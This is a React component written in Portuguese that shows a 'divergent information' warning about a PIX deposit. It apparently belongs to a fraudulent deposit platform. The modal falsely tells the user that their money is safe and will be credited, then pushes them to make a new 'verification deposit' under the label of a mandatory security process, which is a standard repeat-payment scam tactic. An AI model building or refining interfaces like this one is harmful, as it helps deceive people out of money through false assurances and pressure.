import React from 'react';
import { AlertTriangle, Shield, ChevronRight } from 'lucide-react';

interface DataMismatchModalProps {
  isOpen: boolean;
  onReviewData: () => void;
  depositAmount: number;
}

export const DataMismatchModal: React.FC<DataMismatchModalProps> = ({
  isOpen,
  onReviewData,
  depositAmount
}) => {
  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black/95 backdrop-blur-sm flex items-center justify-center p-4 z-[70]">
      <div className="bg-gray-900 rounded-3xl w-full max-w-md shadow-2xl border-2 border-orange-500/30 overflow-hidden animate-scale-in">

        <div className="bg-gradient-to-br from-orange-500 to-orange-600 p-6 text-center relative overflow-hidden">
          <div className="absolute inset-0 bg-black/10"></div>
          <div className="relative z-10">
            <div className="w-20 h-20 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
              <AlertTriangle className="w-10 h-10 text-white" />
            </div>
            <h2 className="text-2xl font-bold text-white mb-2">Informacoes Divergentes</h2>
            <p className="text-white/90 text-sm">Verificamos inconsistencia nos dados</p>
          </div>
        </div>

        <div className="p-6">
          <div className="bg-orange-50 border-2 border-orange-200 rounded-2xl p-5 mb-5">
            <div className="flex items-start gap-3 mb-4">
              <div className="w-10 h-10 bg-orange-500 rounded-full flex items-center justify-center flex-shrink-0">
                <Shield className="w-5 h-5 text-white" />
              </div>
              <div className="flex-1">
                <h3 className="text-orange-900 font-bold text-base mb-2">O que aconteceu?</h3>
                <p className="text-orange-800 text-sm leading-relaxed">
                  Detectamos que os dados cadastrados nao correspondem ao titular da chave PIX utilizada no deposito.
                </p>
              </div>
            </div>

            <div className="bg-white rounded-xl p-4 border border-orange-200 mb-4">
              <div className="flex items-center gap-2 mb-2">
                <div className="w-2 h-2 bg-orange-500 rounded-full"></div>
                <span className="text-orange-900 font-bold text-sm">Valor do deposito:</span>
              </div>
              <div className="text-2xl font-bold text-orange-600 mb-1">
                R$ {depositAmount.toFixed(2).replace('.', ',')}
              </div>
              <p className="text-orange-700 text-xs">
                Este valor esta seguro e sera creditado apos correcao
              </p>
            </div>

            <div className="bg-green-50 border border-green-200 rounded-xl p-3 mb-4">
              <h4 className="text-green-800 font-bold text-xs mb-2">NAO SE PREOCUPE</h4>
              <ul className="text-green-700 text-xs space-y-1.5">
                <li className="flex items-start gap-2">
                  <span className="text-green-500 mt-0.5">✓</span>
                  <span>Seu deposito foi recebido com sucesso</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-500 mt-0.5">✓</span>
                  <span>O valor sera creditado automaticamente</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-500 mt-0.5">✓</span>
                  <span>Voce podera sacar apos a correcao</span>
                </li>
              </ul>
            </div>
          </div>

          <div className="bg-blue-900 border border-blue-700 rounded-xl p-4 mb-5">
            <div className="flex items-start gap-3">
              <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center flex-shrink-0">
                <span className="text-white text-sm">💡</span>
              </div>
              <div>
                <h4 className="text-blue-200 font-bold text-sm mb-2">Como resolver?</h4>
                <p className="text-blue-300 text-xs leading-relaxed mb-3">
                  Revise seus dados cadastrais e corrija qualquer informacao incorreta. Em seguida, faca um novo deposito de verificacao com os dados corretos.
                </p>
                <div className="bg-blue-800/50 rounded-lg p-2">
                  <p className="text-blue-200 text-xs font-medium">
                    Os dados devem corresponder ao titular da chave PIX
                  </p>
                </div>
              </div>
            </div>
          </div>

          <button
            onClick={onReviewData}
            className="w-full bg-gradient-to-r from-orange-500 to-orange-600 text-white font-bold py-4 rounded-2xl hover:from-orange-600 hover:to-orange-700 transition-all duration-300 active:scale-95 shadow-modern"
            style={{ touchAction: 'manipulation' }}
          >
            <div className="flex items-center justify-center gap-3">
              <Shield className="w-5 h-5" />
              <span>REVISAR DADOS AGORA</span>
              <ChevronRight className="w-5 h-5" />
            </div>
          </button>

          <p className="text-center text-gray-500 text-xs mt-4">
            Processo de seguranca obrigatorio para protecao da sua conta
          </p>
        </div>
      </div>
    </div>
  );
};
